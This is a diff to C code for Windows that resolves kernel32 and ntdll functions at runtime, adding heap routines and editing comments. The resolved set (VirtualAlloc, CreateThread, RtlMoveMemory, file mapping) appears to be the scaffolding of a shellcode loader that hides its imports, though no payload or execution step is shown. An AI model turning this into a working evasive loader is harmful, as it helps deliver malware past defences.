@@ -1,4 +1,4 @@
-// --- 1. Define Typedefs for all required function pointers here ---
+// --- 1. Define Typedefs for all required function pointers ---
 typedef HMODULE (WINAPI *pGetModuleHandleA)(LPCSTR);
 typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
 typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
@@ -8,8 +8,12 @@ typedef DWORD (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
 typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
 typedef HANDLE (WINAPI *pCreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
 typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+typedef HANDLE (WINAPI *pGetProcessHeap)(VOID);
+typedef LPVOID (WINAPI *pHeapAlloc)(HANDLE, DWORD, SIZE_T);
+typedef BOOL (WINAPI *pHeapFree)(HANDLE, DWORD, LPVOID);
 
-// --- 2. Declare global variables to hold the resolved function pointers here ---
+
+// --- 2. Declare global variables to hold the resolved function pointers ---
 pVirtualAlloc pfnVirtualAlloc;
 pCreateThread pfnCreateThread;
 pRtlMoveMemory pfnRtlMoveMemory;
@@ -17,10 +21,12 @@ pWaitForSingleObject pfnWaitForSingleObject;
 pCloseHandle pfnCloseHandle;
 pCreateFileMappingW pfnCreateFileMappingW;
 pMapViewOfFile pfnMapViewOfFile;
+pGetProcessHeap pfnGetProcessHeap;
+pHeapAlloc pfnHeapAlloc;
+pHeapFree pfnHeapFree;
 
-// --- 3. The WinAPI resolver function ---
+
 void ResolveAPIs() {
-    // We have to resolve GetProcAddress first
     pGetModuleHandleA pfnGetModuleHandleA = (pGetModuleHandleA)((ULONG_PTR)GetModuleHandleA);
     pGetProcAddress pfnGetProcAddress = (pGetProcAddress)((ULONG_PTR)GetProcAddress(pfnGetModuleHandleA("kernel32.dll"), "GetProcAddress"));
     
@@ -33,11 +39,14 @@ void ResolveAPIs() {
     pfnCloseHandle = (pCloseHandle)pfnGetProcAddress(hKernel32, "CloseHandle");
     pfnCreateFileMappingW = (pCreateFileMappingW)pfnGetProcAddress(hKernel32, "CreateFileMappingW");
     pfnMapViewOfFile = (pMapViewOfFile)pfnGetProcAddress(hKernel32, "MapViewOfFile");
+    pfnGetProcessHeap = (pGetProcessHeap)pfnGetProcAddress(hKernel32, "GetProcessHeap");
+    pfnHeapAlloc = (pHeapAlloc)pfnGetProcAddress(hKernel32, "HeapAlloc");
+    pfnHeapFree = (pHeapFree)pfnGetProcAddress(hKernel32, "HeapFree");
     
     HMODULE hNtdll = pfnGetModuleHandleA("ntdll.dll");
     if (hNtdll == NULL) { return; }
     pfnRtlMoveMemory = (pRtlMoveMemory)pfnGetProcAddress(hNtdll, "RtlMoveMemory");
 
-    DEBUG_PRINT("All API functions resolved dynamically.");
+    DEBUG_PRINT("ResolveApis: API functions resolved.");
 }
 
